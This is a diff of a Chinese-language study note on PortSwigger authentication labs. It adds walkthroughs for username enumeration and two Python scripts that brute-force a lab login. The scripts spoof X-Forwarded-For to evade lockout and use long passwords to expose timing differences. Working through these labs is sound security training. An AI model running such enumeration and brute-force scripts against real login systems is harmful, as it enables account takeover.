@@ -73,7 +73,7 @@ Ref: [https://portswigger.net/web-security/authentication](https://portswigger.n
 
 這可以透過多種方式實現。以下章節展示攻擊者如何使用暴力破解攻擊，以及暴力破解防護中的一些缺陷。你還將了解 HTTP 基本身份驗證中的漏洞。
 
-### 暴力破解攻擊gi
+### 暴力破解攻擊
 
 暴力破解攻擊是指攻擊者使用試錯系統來猜測有效的用戶憑證。這些攻擊通常使用用戶名和密碼的詞彙表進行自動化。將此過程自動化，特別是使用專用工具，可能使攻擊者能夠高速進行大量登錄嘗試。
 
@@ -115,7 +115,7 @@ Ref: [https://portswigger.net/web-security/authentication](https://portswigger.n
 
 ::: tip **Lab: [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)**
 1. 寫程式爆破帳號和密碼：
-    ```python
+    ```Python:line-numbers
     import requests
 
     def init():
@@ -205,9 +205,144 @@ Ref: [https://portswigger.net/web-security/authentication](https://portswigger.n
 ::: tip **Lab: [Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)**
 
 1. 嘗試任意登入，發現回應 `Invalid username or password.`
-2. 使用 Burp 的 Intruder 枚舉使用者名稱，然而
+2. 使用 Burp 的 Intruder 枚舉使用者名稱，觀察回應的差異，發現在枚舉到使用者 `auth` 的時候，回應為 `Invalid username or password`，其少了一個句點（`.`）。
+3. 猜測存在使用者 `auth`
+4. 使用使用者 `auth` 枚舉使用者的密碼，在枚舉到密碼 `777777` 的時候，回應中沒有 `Invalid username or password`。
+5. 使用使用者名稱、密碼：`auth`/`777777` 登入通過此 Lab。
 :::
 
+::: tip Lab: [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)
+
+1. 嘗試輸入任意帳號密碼，回應 `Invalid username or password.`
+2. 嘗試多次登入後發現 `You have made too many incorrect login attempts. Please try again in 30 minute(s).`
+3. 透過修改 HTTP header `X-Forwarded-For` 繞過
+4. 嘗試透過判斷回應時間枚舉出帳號，在此 Lab 中，需枚舉兩個欄位，分別是 `X-Forwared-For` 的 IP，以及使用者名稱。另外，密碼欄位需要使用很長的長度，以增加回應時間的差異性。由於此 Lab 需枚舉兩個欄位，只有專業版的 Burp Suite 才能做到，所以只好自己寫 Exploit。
+5. 枚舉帳號密碼的 Exploit 如下：
+   :::code-group
+
+    ```Python:line-numbers [enum-username.py]
+    #!/usr/bin/python
+    import requests
+
+    cookies = {
+        'session': 'your-session-cookie',
+    }
+
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+        'cache-control': 'max-age=0',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://your-lab-subdomain.web-security-academy.net',
+        'priority': 'u=0, i',
+        'referer': 'https://your-lab-subdomain.web-security-academy.net/login',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"macOS"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+        'X-Forwarded-For': '8.8.8.8',
+    }
+
+    data = {
+        'username': 'wiener',
+        'password': 'peter'*200,
+    }
+
+    response = requests.post(
+        'https://your-lab-subdomain.web-security-academy.net/login',
+        cookies=cookies,
+        headers=headers,
+        data=data,
+        verify=False,
+    )
+
+    usernames = open('usernames.txt', 'r').read().splitlines()
+    passwords = open('passwords.txt', 'r').read().splitlines()
+    output = open('output.csv', 'w')
+
+    for i in range(0, len(usernames)):
+        headers['X-Forwarded-For'] = f'8.{i}.{i}.{i}'
+        data['username'] = usernames[i]
+
+        response = requests.post(
+            'https://your-lab-subdomain.web-security-academy.net/login',
+            cookies=cookies,
+            headers=headers,
+            data=data,
+            verify=False,
+        )
+        
+        output.write(f'{usernames[i]},{response.status_code},{response.elapsed}\n')
+    ```
+
+    ```Python:line-numbers [enum-password.py]
+    # !/usr/bin/python
+    import requests
+
+    cookies = {
+        'session': 'your-session-cookie',
+    }
+
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+        'cache-control': 'max-age=0',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://your-lab-subdomain.web-security-academy.net',
+        'priority': 'u=0, i',
+        'referer': 'https://your-lab-subdomain.web-security-academy.net/login',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"macOS"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+        'X-Forwarded-For': '8.8.8.8',
+    }
+
+    data = {
+        'username': 'mysql',
+        'password': 'peter'*200,
+    }
+
+    response = requests.post(
+        'https://your-lab-subdomain.web-security-academy.net/login',
+        cookies=cookies,
+        headers=headers,
+        data=data,
+        verify=False,
+    )
+
+    usernames = open('usernames.txt', 'r').read().splitlines()
+    passwords = open('passwords.txt', 'r').read().splitlines()
+
+    for i in range(0, len(passwords)):
+        headers['X-Forwarded-For'] = f'8.{i}.{i}.{i}'
+        data['password'] = passwords[i]
+
+        response = requests.post(
+            'https://your-lab-subdomain.web-security-academy.net/login',
+            cookies=cookies,
+            headers=headers,
+            data=data,
+            verify=False,
+        )
+
+        if 'Invalid username or password.' not in response.text:
+            print(f'Found valid credentials: {data['username']}:{passwords[i]}')
+            break
+    ```
+    :::
+6. 經過枚舉後取得帳號密碼為 `mysq`l/`freedom`，通過此 Lab。
+:::
 
 ## 第三方身分驗證機制的漏洞
 
